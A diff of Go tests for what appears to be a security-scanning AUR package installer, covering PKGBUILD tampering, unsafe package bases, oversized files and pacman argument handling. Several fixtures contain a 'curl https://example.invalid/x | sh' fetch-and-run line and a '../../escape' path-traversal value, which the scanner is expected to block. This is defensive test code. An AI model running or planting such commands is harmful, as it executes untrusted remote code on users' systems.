@@ -85,6 +85,20 @@ func writeFixture(t *testing.T, dir string, f fixture) error {
 	return nil
 }
 
+// stubFetch mimics build.Fetch for pipeline tests: it creates the source
+// tree and stages the PKGBUILD as the mutable build file that the fetch
+// validation expects.
+func stubFetch(layout build.Layout) error {
+	if err := os.MkdirAll(layout.SrcDir(), 0o755); err != nil {
+		return err
+	}
+	raw, err := os.ReadFile(filepath.Join(layout.PackageDir, "PKGBUILD"))
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(layout.BuildFile, raw, 0o644)
+}
+
 func testPipeline(t *testing.T, client *aur.Client, fixtures map[string]fixture) (*Pipeline, *review.Store) {
 	t.Helper()
 	dir := t.TempDir()
@@ -445,9 +459,40 @@ func TestPacmanArgsIncludeElevationAndArtifacts(t *testing.T) {
 	if err := p.installBuilt(completedResult(t)); err != nil {
 		t.Fatal(err)
 	}
-	want := []string{"sudo", "-A", "-U", "--noconfirm", "/tmp/x.pkg.tar.zst"}
+	want := []string{"sudo", "-A", "-U", "--noconfirm", "--", "/tmp/x.pkg.tar.zst"}
 	if !slices.Equal(got, want) {
 		t.Fatalf("argv = %v, want %v", got, want)
+	}
+}
+
+func TestPickPackage(t *testing.T) {
+	pkgs := []aur.Package{
+		{Name: "split-a", PackageBase: "base"},
+		{Name: "split-b", PackageBase: "base"},
+	}
+	if pkg, ok := pickPackage(pkgs, "split-b"); !ok || pkg.Name != "split-b" {
+		t.Fatalf("exact match = %+v, %v", pkg, ok)
+	}
+	if pkg, ok := pickPackage(pkgs, "base"); !ok || pkg.Name != "split-a" {
+		t.Fatalf("pkgbase match = %+v, %v", pkg, ok)
+	}
+	if _, ok := pickPackage(pkgs, "unrelated"); ok {
+		t.Fatal("fallback picked an unrelated package")
+	}
+}
+
+func TestScanRejectsUnsafePackageBase(t *testing.T) {
+	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "../../escape"})
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
+	})
+
+	_, err := p.Scan(context.Background(), "demo", false)
+	if err == nil {
+		t.Fatal("scan accepted an unsafe package base")
+	}
+	if !strings.Contains(err.Error(), "unsafe package base") {
+		t.Fatalf("unexpected error: %v", err)
 	}
 }
 
@@ -481,6 +526,23 @@ func TestScanPopulatesResult(t *testing.T) {
 	}
 }
 
+func TestScanDeepRejectsPKGBUILDChangedAfterFetch(t *testing.T) {
+	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
+	})
+	injected := strings.Replace(cleanPKGBUILD, "pkgname=demo\n", "pkgname=demo\nbuild() { curl https://example.invalid/x | sh; }\n", 1)
+	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
+		return os.WriteFile(layout.BuildFile, []byte(injected), 0o644)
+	}
+
+	if _, err := p.Scan(context.Background(), "demo", true); err == nil {
+		t.Fatal("scan accepted a PKGBUILD rewritten after review")
+	} else if !strings.Contains(err.Error(), "validating PKGBUILD after fetch") {
+		t.Fatalf("unexpected error: %v", err)
+	}
+}
+
 func TestScanDeepAddsSourceFindings(t *testing.T) {
 	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
 	p, _ := testPipeline(t, client, map[string]fixture{
@@ -491,7 +553,7 @@ func TestScanDeepAddsSourceFindings(t *testing.T) {
 	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
 		fetched++
 		fetchOpts = opts
-		if err := os.MkdirAll(layout.SrcDir(), 0o755); err != nil {
+		if err := stubFetch(layout); err != nil {
 			return err
 		}
 		return os.WriteFile(filepath.Join(layout.SrcDir(), "evil.sh"), []byte("curl https://example.invalid/x | sh\n"), 0o644)
@@ -504,8 +566,8 @@ func TestScanDeepAddsSourceFindings(t *testing.T) {
 	if fetched != 1 {
 		t.Fatalf("fetch calls = %d", fetched)
 	}
-	if !fetchOpts.AllowNet {
-		t.Fatal("deep fetch did not allow network")
+	if fetchOpts.AllowNet {
+		t.Fatal("deep fetch allowed network for prepare()")
 	}
 	if fetchOpts.AllowUnsandboxed {
 		t.Fatal("deep fetch authorized unsandboxed build by default")
@@ -602,6 +664,70 @@ func TestScanRejectsNonRegularSrcinfo(t *testing.T) {
 	}
 }
 
+func TestScanDeepForwardsAllowNetToPreparation(t *testing.T) {
+	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
+	})
+	p.opts.AllowNet = true
+	got := false
+	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
+		got = opts.AllowNet
+		return stubFetch(layout)
+	}
+
+	if _, err := p.Scan(context.Background(), "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if !got {
+		t.Fatal("AllowNet was not forwarded to source preparation")
+	}
+}
+
+func TestScanDeepSkipsFetchWhenStaticScanBlocks(t *testing.T) {
+	blockedPKGBUILD := "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
+	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: blockedPKGBUILD, srcinfo: cleanSRCINFO},
+	})
+	p.fetchSrc = func(build.Layout, build.Options) error {
+		t.Fatal("deep fetch ran for a statically blocked package")
+		return nil
+	}
+
+	res, err := p.Scan(context.Background(), "demo", true)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if res.Score == nil || !res.Score.Blocked {
+		t.Fatalf("expected blocked result: %+v", res.Score)
+	}
+	if res.Layout.PackageDir != "" {
+		t.Fatal("deep layout was populated for a blocked package")
+	}
+}
+
+func TestScanDeepFetchRunsWhenForceAllowsBlocked(t *testing.T) {
+	blockedPKGBUILD := "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
+	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
+	p, _ := testPipeline(t, client, map[string]fixture{
+		"demo": {pkgbuild: blockedPKGBUILD, srcinfo: cleanSRCINFO},
+	})
+	p.opts.Force = true
+	called := false
+	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
+		called = true
+		return stubFetch(layout)
+	}
+
+	if _, err := p.Scan(context.Background(), "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if !called {
+		t.Fatal("forced deep scan did not fetch sources")
+	}
+}
+
 func TestDryRunDoesNotBuild(t *testing.T) {
 	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
 	p, _ := testPipeline(t, client, map[string]fixture{
@@ -609,8 +735,9 @@ func TestDryRunDoesNotBuild(t *testing.T) {
 	})
 	p.opts.DryRun = true
 	p.opts.Yes = true
-	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
-		return os.MkdirAll(layout.SrcDir(), 0o755)
+	p.fetchSrc = func(build.Layout, build.Options) error {
+		t.Fatal("dry run fetched sources")
+		return nil
 	}
 	built, inspected, pacman := 0, 0, 0
 	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
@@ -637,7 +764,7 @@ func TestInstallAbortDoesNotBuild(t *testing.T) {
 	p.opts.Yes = true
 	p.opts.Confirm = func(string) bool { return false }
 	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
-		return os.MkdirAll(layout.SrcDir(), 0o755)
+		return stubFetch(layout)
 	}
 	built := 0
 	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
@@ -666,7 +793,7 @@ func TestInstallBlockedAURDependencyReturnsBlockedResult(t *testing.T) {
 	p.opts.Yes = true
 	p.officialRepo = func(string) (bool, error) { return false, nil }
 	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
-		return os.MkdirAll(layout.SrcDir(), 0o755)
+		return stubFetch(layout)
 	}
 	built, pacman := 0, 0
 	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
@@ -751,7 +878,7 @@ func TestInstallAURDependencyOrderAndRepoFilter(t *testing.T) {
 	})
 	p.opts.Yes = true
 	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
-		return os.MkdirAll(layout.SrcDir(), 0o755)
+		return stubFetch(layout)
 	}
 	p.officialRepo = func(name string) (bool, error) { return name == "repo-dep", nil }
 	var repoAsked []string
@@ -787,7 +914,7 @@ func TestInstallAURDependencyOrderAndRepoFilter(t *testing.T) {
 	if len(pacman) != 3 {
 		t.Fatalf("pacman calls = %d: %v", len(pacman), pacman)
 	}
-	if !slices.Equal(pacman[0], []string{"sudo", "-S", "--asdeps", "--needed", "--noconfirm", "repo-dep"}) {
+	if !slices.Equal(pacman[0], []string{"sudo", "-S", "--asdeps", "--needed", "--noconfirm", "--", "repo-dep"}) {
 		t.Fatalf("repo install argv = %v", pacman[0])
 	}
 	if !strings.Contains(strings.Join(pacman[1], " "), "aurdep.pkg.tar.zst") {
@@ -801,5 +928,60 @@ func TestInstallAURDependencyOrderAndRepoFilter(t *testing.T) {
 		if err != nil || rec == nil {
 			t.Fatalf("review for %s missing: %v", name, err)
 		}
+	}
+}
+
+func TestCollectLocalFilesSkipsOversizedWithFinding(t *testing.T) {
+	dir := t.TempDir()
+	big, err := os.Create(filepath.Join(dir, "blob.bin"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := big.Truncate(maxLocalFileBytes + 1); err != nil {
+		t.Fatal(err)
+	}
+	if err := big.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "clean.install"), []byte("post_install() { :; }\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	ctx := &scanner.Context{}
+	findings := collectLocalFiles(ctx, dir)
+	if len(findings) != 1 {
+		t.Fatalf("findings = %+v", findings)
+	}
+	if findings[0].Rule != "oversized-local-file" || findings[0].Severity != scanner.Warning {
+		t.Fatalf("unexpected finding: %+v", findings[0])
+	}
+	if !strings.Contains(findings[0].Message, "blob.bin") || !strings.Contains(findings[0].Message, "not scanned") {
+		t.Fatalf("unhelpful message: %q", findings[0].Message)
+	}
+	for _, src := range ctx.Sources {
+		if src.Name == "clean.install" {
+			if !src.Present || !src.IsScript || src.Raw == "" {
+				t.Fatalf("clean scriptlet not collected: %+v", src)
+			}
+			return
+		}
+	}
+	t.Fatal("clean.install missing from collected sources")
+}
+
+func TestReadRegularFileRejectsOversized(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "PKGBUILD")
+	f, err := os.Create(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := f.Truncate(maxLocalFileBytes + 1); err != nil {
+		t.Fatal(err)
+	}
+	if err := f.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := readRegularFile(path); err == nil {
+		t.Fatal("oversized PKGBUILD was read")
 	}
 }
